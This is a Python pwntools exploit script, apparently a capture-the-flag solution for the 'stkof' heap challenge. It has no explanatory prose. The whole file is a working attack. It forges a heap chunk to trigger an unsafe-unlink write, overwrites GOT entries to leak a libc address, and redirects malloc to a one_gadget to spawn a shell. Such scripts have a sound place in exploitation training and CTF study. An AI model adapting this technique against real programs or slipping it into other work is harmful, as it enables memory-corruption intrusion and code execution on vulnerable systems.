
import pwn as p


target = p.process('./stkof', env={"LD_PRELOAD": "./libc-2.23.so"})
# p.gdb.attach(target, gdbscript='b *0x00400d29')

elf = p.ELF("stkof")
libc = p.ELF("libc-2.23.so")


def b(msg):
    return bytes(msg, 'utf8')


def s(b):
    return b.decode('utf8')


def allocate(size):
    target.sendline(b('1'))
    target.sendline(b(str(size)))
    print(s(target.recvuntil(b('OK\n'))), end='')


def read(index, size, val):
    if size != len(val):
        print(f'uh oh: size ({size}) not aligned with value ({val})')
    target.sendline(b('2'))
    target.sendline(b(str(index)))
    target.sendline(b(str(size)))
    target.send(val)
    print(s(target.recvuntil(b('OK\n'))), end='')


def free(index):
    target.sendline(b('3'))
    target.sendline(b(str(index)))
    print(s(target.recvuntil(b('OK\n'))), end='')


def leak(index):
    target.sendline(b('4'))
    target.sendline(b(str(index)))
    line = target.recvline()[:-1]  # remove newline at the end
    leak = p.u64(line + b'\x00' * (8 - len(line)))
    print(s(target.recvuntil(b('OK\n'))), end='')
    print(f'leak: {hex(leak)}')
    return leak


pointer_array_ptr = 0x602140
fake_chunk_ptr = pointer_array_ptr + 0x20  # second item in the ptr array

for i in range(6):
    allocate(0xa0)  # the fourth chunk will hold the fake chunk

fake_chunk = b''
fake_chunk += p.p64(0x0)  # previous size
fake_chunk += p.p64(0xa0)  # size
fake_chunk += p.p64(fake_chunk_ptr - 0x8*3)  # fd
fake_chunk += p.p64(fake_chunk_ptr - 0x8*2)  # bk
fake_chunk += p.p64(0x0)  # fd_nextsize, to avoid checks
fake_chunk += p.p64(0x0) * ((0xa0 - 0x20) // 8 - 1)  # filler to the next chunk

fake_chunk += p.p64(0xa0)  # overflow to the next chunk; previous size
fake_chunk += p.p64(0xb0)  # size, set its "previous used bit" to 0 (aka our fake chunk)

read(4, len(fake_chunk), fake_chunk)

free(5)  # unlink attack

read(4, 0x10, p.p64(elf.got['strlen']) + p.p64(elf.got['malloc']))
read(1, 0x8, p.p64(elf.symbols['puts']))

malloc_leak = leak(2)
libc_base = malloc_leak - libc.symbols['malloc']

one_gadget_ptr = 0xf1147 + libc_base

read(2, 0x8, p.p64(one_gadget_ptr))

target.send(b'1\n1\n')  # not calling `allocate` because it will never display 'OK'

target.interactive()
